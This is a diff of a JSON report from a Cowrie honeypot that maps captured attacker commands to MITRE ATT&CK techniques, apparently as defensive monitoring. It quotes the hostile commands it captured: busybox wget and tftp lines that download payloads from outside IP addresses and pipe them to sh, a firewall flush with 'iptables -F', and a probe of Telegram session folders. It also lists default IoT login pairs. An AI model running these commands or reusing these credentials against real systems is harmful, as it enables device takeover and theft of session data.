@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-19 04:00:16",
+  "generated": "2026-08-19 05:00:45",
   "totals": {
-    "commands": 4478,
-    "login_failed": 2336,
-    "login_success": 1478,
-    "sessions": 2407
+    "commands": 4531,
+    "login_failed": 2356,
+    "login_success": 1485,
+    "sessions": 2438
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2336,
+      "count": 2356,
       "examples": [
         "root / vizxv",
         "root / 19801021",
@@ -21,14 +21,14 @@
         "root / 19820308"
       ],
       "first": "2026-08-19T00:00:00.138204Z",
-      "last": "2026-08-19T03:58:28.765967Z",
-      "unique_ips": 22
+      "last": "2026-08-19T04:51:35.371193Z",
+      "unique_ips": 31
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1478,
+      "count": 1485,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "hikvision / hikvision",
@@ -37,8 +37,8 @@
         "telnetadmin / telnetadmin"
       ],
       "first": "2026-08-19T00:00:00.538972Z",
-      "last": "2026-08-19T03:23:03.055903Z",
-      "unique_ips": 13
+      "last": "2026-08-19T04:30:03.579363Z",
+      "unique_ips": 20
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 10,
+      "count": 21,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,21 +69,22 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T02:58:29.371755Z",
-      "unique_ips": 3
+      "last": "2026-08-19T04:04:33.945110Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 4,
+      "count": 6,
       "examples": [
         "uname -a",
-        "uname -s -v -n -r -m"
+        "uname -s -v -n -r -m",
+        "cat /proc/cpuinfo"
       ],
       "first": "2026-08-19T01:22:46.787305Z",
-      "last": "2026-08-19T03:18:43.978281Z",
-      "unique_ips": 4
+      "last": "2026-08-19T04:03:46.613168Z",
+      "unique_ips": 5
     },
     {
       "id": "T1033",
@@ -96,20 +97,69 @@
       "first": "2026-08-19T00:55:56.123389Z",
       "last": "2026-08-19T02:03:39.341290Z",
       "unique_ips": 2
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'"
+      ],
+      "first": "2026-08-19T04:03:47.375514Z",
+      "last": "2026-08-19T04:03:48.137017Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "ifconfig"
+      ],
+      "first": "2026-08-19T04:03:45.090797Z",
+      "last": "2026-08-19T04:03:45.090797Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
+      ],
+      "first": "2026-08-19T04:03:48.902046Z",
+      "last": "2026-08-19T04:03:48.902046Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1562.004",
+      "name": "Impair Defenses: Disable or Modify System Firewall",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "iptables -F"
+      ],
+      "first": "2026-08-19T04:04:30.924428Z",
+      "last": "2026-08-19T04:04:30.924428Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "shell",
-      1471
+      1474
     ],
     [
       "sh",
-      1471
+      1474
     ],
     [
       "system",
-      1454
+      1457
     ],
     [
       "/bin/busybox LZRD",
@@ -117,31 +167,31 @@
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      8
+      12
     ],
     [
       "/bin/busybox",
-      7
+      11
     ],
     [
       "enable",
-      3
+      6
     ],
     [
       "linuxshell",
-      2
-    ],
-    [
-      "enablelinuxshell",
-      2
+      5
     ],
     [
       "ping ;sh",
-      2
+      5
     ],
     [
       "cd /proc && cat self/cmdline",
-      2
+      5
+    ],
+    [
+      "enablelinuxshell",
+      4
     ],
     [
       "/bin/busybox IZ1H9",
@@ -161,6 +211,22 @@
     ],
     [
       "/bin/busybox hostname TOASTER",
+      1
+    ],
+    [
+      "/ip cloud print",
+      1
+    ],
+    [
+      "locate D877F783D5D3EF8Cs",
+      1
+    ],
+    [
+      "echo Hi | cat -n",
+      1
+    ],
+    [
+      "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/",
       1
     ]
   ]
